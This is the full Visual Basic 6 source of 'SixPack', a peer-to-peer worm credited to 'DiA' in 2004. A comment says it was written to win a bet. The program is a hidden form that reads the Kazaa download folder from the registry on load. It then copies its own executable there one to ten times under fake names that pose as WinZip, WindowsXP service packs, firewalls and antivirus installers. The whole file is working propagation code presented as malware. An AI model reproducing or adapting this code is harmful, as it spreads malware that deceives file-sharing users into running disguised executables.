   VERSION 5.00
   Begin VB.Form frmSixPack
      BorderStyle     =   1  'Fest Einfach
      Caption         =   "thx for this SixPack - DiA (c) 04"
      ClientHeight    =   0
      ClientLeft      =   5325
      ClientTop       =   4170
      ClientWidth     =   3345
      Icon            =   "frmSixPack.frx":0000
      LinkTopic       =   "Form1"
      MaxButton       =   0   'False
      MinButton       =   0   'False
      ScaleHeight     =   0
      ScaleWidth      =   3345
      Visible         =   0   'False
   End
   Attribute VB_Name = "frmSixPack"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   'SixPack Ver 1.0 by DiA (c)2004 Germany
   'written for a SixPack Beer
   '
   'Story: On a Saturday I was on a Party. A friend (who also program [in VB])
   '       and I talk about the MyDoom Worm... blablabla. He think it's really
   '       hard to code a Worm. I said a lame Worm is easyer to code then a
   '       lame Virus! He would not believe this! He don't really know much
   '       about Viruses And Worms... ....hehehehe =) So i said if I code a
   '       Worm, with the time-limit : Monday 15:00, he must buy me a Beer.
   '       But he said NO. It's to easy for me to write this!?! He said if I
   '       code a Worm in VB, he buy me a SixPack Beer! Allright, on Sunday he
   '       give me Visual Basic 6 Enterprise Edition. I got Informations from
   '       only one Website! And the I code this little lame P2P Worm. Fuckin
   '       Hell, VB is so easy to understand! WOW! Every Idiot can code fuckin
   '       lame malware with VB. Fuck Off, now I won a SixPack Beer! Yeah...
   '
   '       I never used VisualBasic before... my first program! ;)
   'http://www.vx-dia.de.vu/
   '___________________________________________________________


   Dim WS As Object
   Dim RegPath As String
   Dim KazaaFolder As String
   Dim SixPack As String
   Dim FFName(9) As String
   Dim FakeFileName As String
   Dim FFNameNumber As Integer
   Dim FakeVer1 As Integer
   Dim FakeVer2 As Integer
   Dim FakeVer3 As Integer
   Dim InfPerRun As Integer


   'to read Kazaa Download Folder from Registry
   Function RegRead(RegPath As String) As String
       On Error GoTo ErrorHandler

       Set WS = CreateObject("WScript.Shell")
       RegRead = WS.RegRead(RegPath)
       Exit Function

   'no Registry Entry -> no Kazaa installed...
   ErrorHandler:
       RegRead = "DiA"
   End Function


   'to get a random number between min - max
   Function RandomNumber(ByVal min, ByVal max)
       Randomize
       RandomNumber = Int(min + (max - min + 1) * Rnd)
   End Function


   'infection routine
   Function SixPackInfection()
   'FakeFileNAmes
   FFName(0) = "VisualBasic6_" '=)
   FFName(1) = "SygatePersonalFirewall_"
   FFName(2) = "Frontpage2004_"
   FFName(3) = "WinZip8_"
   FFName(4) = "WinRAR_Final_"
   FFName(5) = "ICQ_Pro_"
   FFName(6) = "WindowsXP_Pro_Sp1_"
   FFName(7) = "AntiVirPersonal_"
   FFName(8) = "SophosAntiVirus_"
   FFName(9) = "this_is_a_lame_worm_" 'please, never spread this shitty worm! =]


       'get Kazaa Download folder
       KazaaFolder = RegRead("HKEY_CURRENT_USER\Software\Kazaa\Transfer\DlDir0")

       'check if this registry key exists
       If KazaaFolder <> "DiA" Then

           'get full path of this file
           SixPack = App.Path & "\" & App.EXEName & ".exe"

           'generate FakeFileName
           FFNameNumber = RandomNumber(0, 9)
           FakeVer1 = RandomNumber(0, 9)
           FakeVer2 = RandomNumber(0, 9)
           FakeVer3 = RandomNumber(0, 9)

           FakeFileName = FFName(FFNameNumber) & FakeVer1 & "." & FakeVer2 & "." & FakeVer3 & ".exe"

           'copy SixPAck to FakeNAme in the Kazaa Download Directory
           FileCopy SixPack, KazaaFolder & "\" & FakeFileName

       Else
           'no regKey
           'exit SixPack
           End

       End If
   End Function


   Private Sub Form_Load()
   'Random Number of copys
   InfPerRun = RandomNumber(1, 9)

       For i = 0 To InfPerRun
           SixPackInfection 'lame VB shit, but i won a SixPack Beer
       Next i

       'simply a funny Msg
       MsgBox "Yeah! I won a SixPack Beer! That's fuckin great!", vbInformation, "SixPack 1.0 by DiA (c)04"

       End 'exit SixPAck worm
   End Sub
